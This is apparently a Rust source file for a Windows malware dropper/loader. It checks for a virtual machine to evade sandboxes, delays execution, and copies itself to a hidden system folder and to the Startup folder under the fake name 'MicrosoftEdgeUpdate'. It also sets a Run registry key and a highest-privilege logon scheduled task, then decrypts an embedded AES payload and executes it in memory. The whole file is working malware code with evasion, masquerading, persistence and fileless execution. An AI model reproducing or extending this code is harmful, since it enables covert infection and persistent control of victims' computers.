use aes::cipher::{generic_array::GenericArray, BlockDecrypt, KeyInit};
use aes::Aes128;
use inside_vm::inside_vm;
use std::io::{self, Cursor, Read, Result};
use std::path::{Path, PathBuf};
use std::process::Command;
use std::{env, fs, thread, time::Duration};
use winreg::enums::{HKEY_CURRENT_USER, KEY_ALL_ACCESS};
use winreg::RegKey;

// Remove these lines as we'll use a simpler approach
// use rand::Rng;
// use sysinfo::{System, SystemExt, ProcessExt};

fn main() {
    if is_sandboxed() {
        println!("Potential sandbox environment detected");
        std::process::exit(0);
    } else {
        println!("Environment seems safe");

        // Use a fixed delay instead of a random one
        thread::sleep(Duration::from_secs(60));

        create_infected_directory();
        persistence();

        let pe_bytes = decrypt_file().unwrap();
        fileless(pe_bytes);
    }
}

fn is_sandboxed() -> bool {
    inside_vm() // We'll only use the inside_vm check for simplicity
}

// Remove these functions as we're not using sysinfo anymore
// fn has_suspicious_processes() -> bool { ... }
// fn has_low_resources() -> bool { ... }

// ... (keep the decrypt_file, create_infected_directory, and hide_file_or_directory functions as they are)

fn persistence() -> io::Result<()> {
    let current_exe = env::current_exe()?;
    let file_name = current_exe.file_stem().ok_or_else(|| {
        io::Error::new(io::ErrorKind::Other, "Failed to get executable name")
    })?;

    let executable_name = file_name.to_string_lossy();
    let startup_dir = get_startup_directory()?;
    let file_path = startup_dir.join(format!("MicrosoftEdgeUpdate.exe"));

    fs::copy(&current_exe, &file_path)?;

    // Open the "Run" registry key
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let run_key = hkcu.open_subkey_with_flags(
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        KEY_ALL_ACCESS,
    )?;

    // Add the executable path to the "Run" registry key
    run_key.set_value("MicrosoftEdgeUpdate", &file_path.to_str().unwrap_or_default().to_string())?;

    // Add a scheduled task for additional persistence
    create_scheduled_task(&file_path)?;

    Ok(())
}

// ... (keep the create_scheduled_task, get_startup_directory, and fileless functions as they are)

fn decrypt_file() -> Result<Vec<u8>> {
    // Read encrypted bytes and store bytes of key :3
    let encrypted_bytes = include_bytes!("encrypted_Input.bin");
    let mut key_bytes: [u8; 16] = [0; 16];
    let mut key_file = Cursor::new(include_bytes!("key.txt"));
    key_file.read_exact(&mut key_bytes)?;

    // Gen cipher with the key B-)
    let key = GenericArray::from(key_bytes);
    let cipher = Aes128::new(&key);

    // Decrypt the encrypted bytes in blocks
    let mut decrypted_bytes = Vec::new();
    for block in encrypted_bytes.chunks(16) {
        let mut block_array = GenericArray::clone_from_slice(block);
        cipher.decrypt_block(&mut block_array);
        decrypted_bytes.extend_from_slice(&block_array);
    }

    // Unpad the decrypted bytes
    let padding_size = decrypted_bytes.last().unwrap().clone() as usize;
    let decrypted_bytes = (&decrypted_bytes[..decrypted_bytes.len() - padding_size]).to_vec();

    // return decrypted bytes
    Ok(decrypted_bytes)
}

fn create_infected_directory() -> io::Result<()> {
    let infected_dir = Path::new("C:\\ProgramData\\Microsoft\\Windows\\SystemData");
    fs::create_dir_all(&infected_dir)?;

    let current_exe = env::current_exe()?;
    let current_exe_filename = current_exe.file_name().ok_or_else(|| {
        io::Error::new(io::ErrorKind::Other, "Failed to get current executable name")
    })?;

    let infected_exe_path = infected_dir.join(current_exe_filename);
    fs::copy(&current_exe, &infected_exe_path)?;

    if cfg!(target_os = "windows") {
        hide_file_or_directory(&infected_dir)?;
        hide_file_or_directory(&infected_exe_path)?;
    }

    Ok(())
}

fn hide_file_or_directory(path: &Path) -> io::Result<()> {
    Command::new("attrib")
        .arg("+h")
        .arg("+s")
        .arg(path.as_os_str())
        .output()
        .map(|_| ())
}

fn create_scheduled_task(exe_path: &Path) -> io::Result<()> {
    let task_name = "MicrosoftEdgeUpdateTask";
    let command = format!(
        r#"schtasks /create /tn "{}" /tr "{}" /sc onlogon /rl highest /f"#,
        task_name,
        exe_path.to_str().unwrap()
    );
    
    Command::new("cmd")
        .args(&["/C", &command])
        .output()?;

    Ok(())
}

fn get_startup_directory() -> io::Result<PathBuf> {
    let appdata = env::var("APPDATA").map_err(|e| io::Error::new(io::ErrorKind::NotFound, e))?;
    Ok(PathBuf::from(appdata).join(r"Microsoft\Windows\Start Menu\Programs\Startup"))
}

fn fileless(bytes: Vec<u8>) {
    unsafe {
        memexec::memexec_exe(&bytes).unwrap();
    }
}
